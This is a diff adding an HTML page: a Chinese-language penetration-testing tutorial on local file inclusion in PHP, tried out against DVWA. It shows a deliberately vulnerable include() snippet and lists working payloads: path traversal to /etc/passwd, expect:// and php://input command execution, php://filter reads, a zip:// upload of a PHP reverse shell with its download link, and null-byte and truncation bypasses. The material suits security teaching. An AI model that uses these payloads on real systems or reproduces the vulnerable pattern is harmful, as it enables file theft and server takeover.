@@ -1,1 +1,415 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Web应用渗透测试-本地文件包含</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
 
+/* Author: ZuSheng-Securit*/
+
+/* Source: https://www.isbase.cc */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+</head>
+<body>
+<h3>Web应用渗透测试-本地文件包含</h3>
+<h3>Author：zusheng</h3>
+<h3>Link：<a href="http://www.isbase.cc">http://www.isbase.cc</a></h3>
+<h2>0x01 前言</h2>
+<p>本文的目的在于帮助网络安全爱好者们去识别和测试LFI漏洞，通过研究去探究LFI渗透测试技术以及LFI漏洞通常在哪里被发现。如果你有更好的奇淫技巧，欢迎分享。</p>
+<h2>0x02 什么是本地文件包含漏洞</h2>
+<p>本地文件包含漏洞是指只能包含本机文件的文件包含漏洞，当Web应用程序未合理的包含一个文件时，存在此漏洞。攻击者可以控制输入注入路径遍历字符或服务器上其他文件进行攻击。下面就让我们详细的分析一下漏洞原理和利用技巧.</p>
+<p>首先我们来看一段存在文件包含漏洞的PHP代码：</p>
+<pre><code>&lt;?php
+$file = $_GET['file'];  
+if(isset($file)){
+    include(&quot;pages/$file&quot;);
+}
+else{
+    include(&quot;index.php&quot;);
+}
+?&gt;
+</code></pre>
+
+<p>这里我们使用了include函数包含了一个用户输入的文件。</p>
+<p>LFI漏洞很容易识别和利用，例如：</p>
+<pre><code>/lfi.php?file=index.html
+</code></pre>
+
+<p>我们可以通过操作文件位置来利用此漏洞，如：</p>
+<pre><code>/lfi.php?file=../../../../../../../../etc/passwd
+</code></pre>
+
+<p>以上是显示Linux/UNIX下的/etc/passwd文件。</p>
+<p>以下是成功利用Web应用程序上的LFI漏洞的示例：</p>
+<img src="lfi/l1.png" />
+<h2>0x03 PHP Wrappers</h2>
+<p>PHP封装了很多协议，通常我们可以利用它来绕过各种输入过滤。</p>
+<h3>PHP Expect Wrapper</h3>
+<p>PHP expect://允许执行系统命令，不过很可惜，需要安装扩展</p>
+<p>http://pecl.php.net/package/expect</p>
+<p>默认情况下不启用</p>
+<pre><code>http://127.0.0.1/lfi.php?file=expect://ls
+</code></pre>
+
+<h3>php://input</h3>
+<p>php://input 是个可以访问请求的原始数据的只读流。</p>
+<p>我们可以使用这个协议来执行命令：</p>
+<img src="lfi/l2.png" />
+<h3>PHP php://filter</h3>
+<p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。它可以打开本地文件然后以base64编码输出。有时候被过滤的时候，可以尝试使用这个方法来包含文件。</p>
+<pre><code>?page=php://filter/convert.base64-encode/resource=/etc/passwd
+</code></pre>
+
+<p>以dwva为例：</p>
+<img src="lfi/l3.png" />
+<p>输出的字符是以base64编码输出的，所以我们需要解密：</p>
+<img src="lfi/l4.png" />
+<p>我们也可以不使用base64编码输出：</p>
+<pre><code>?page=php://filter/resource=/etc/passwd
+</code></pre>
+
+<p>如图：</p>
+<img src="lfi/l5.png" />
+<h3>PHP ZIP Wrapper LFI</h3>
+<p>这是一个压缩流，利用这个让的前提是能上传一个我们自己能控制zip压缩包，攻击流程如下：</p>
+<ol>
+<li>创建一个PHP反弹shell</li>
+<li>压缩成shell.zip</li>
+<li>上传至目标服务器</li>
+<li>payload：?page=zip://路径/shell.zip%23shell.php</li>
+<li>坐等shell</li>
+</ol>
+<p>反弹shell下载地址：</p>
+<p>http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz</p>
+<p>Payload：</p>
+<pre><code>127.0.0.1/dvwa/vulnerabilities/fi/?page=zip://shell.zip%23shell.php
+</code></pre>
+
+<p>反弹成功：</p>
+<img src="lfi/l6.png" />
+<h2>0x04 空字节技术</h2>
+<p>通过在URL编码中增加“空字节”，比如“00%”，在某些情况下能绕过WEB应用程序中的过滤。通常，增加空字符后，后端的WEB应用程序对该输入有可能会放行或不处理，从而可以绕过WEB应用黑名单过滤器。</p>
+<p>下面是一些特殊的LFI空字节注入的实例：</p>
+<pre><code>?page=/etc/passwd%00
+?page=/etc/passwd%2500
+</code></pre>
+
+<h2>0x05 截断LFI绕过</h2>
+<p>截断是另一个绕过黑名单的技术，通过向有漏洞的文件包含机制中注入一个长的参数，WEB应用有可能会“砍掉它”(截断)输入的参数，从而有可能绕过输入过滤。</p>
+<pre><code>%00截断：
+/etc/passwd%00
+(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)
+
+%00截断目录遍历：
+/var/www/%00
+(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)
+
+路径长度截断：
+/etc/passwd/././././././.[…]/./././././.
+(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)
+
+点号截断：
+/boot.ini/………[…]…………
+(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)
+</code></pre>
+
+<p>LFI截断实例：</p>
+<pre><code>?page=/etc/passwd…………………………………………………………………………….
+?page=../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+?page=/etc/passwd/../../../../../../../../../../../../../../../../../..
+</code></pre>
+
+<h2>0x06 总结</h2>
+<p>本篇文章主要针对了web应用常规漏洞的本地文件包含漏洞作了详细的介绍，希望大家能给点建议，欢迎大家关注我的新浪微博：孤独zusheng，给我留言或者评论。本技术站追求纯粹的技术分享，也欢迎大家联系我分享自己的技术。</p>
+<h2>0x07 参考资料</h2>
+<ul>
+<li>https://www.exploit-db.com/docs/40992.pdf</li>
+<li>http://www.php.net/manual/zh/wrappers.php</li>
+<li>https://highon.coffee/blog/lfi-cheat-sheet/</li>
+<li>https://www.owasp.org/index.php/PHP<em>File</em>Inclusion </li>
+<li>DVWA(用于LFI实例):http://www.dvwa.co.uk/ </li>
+</ul>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
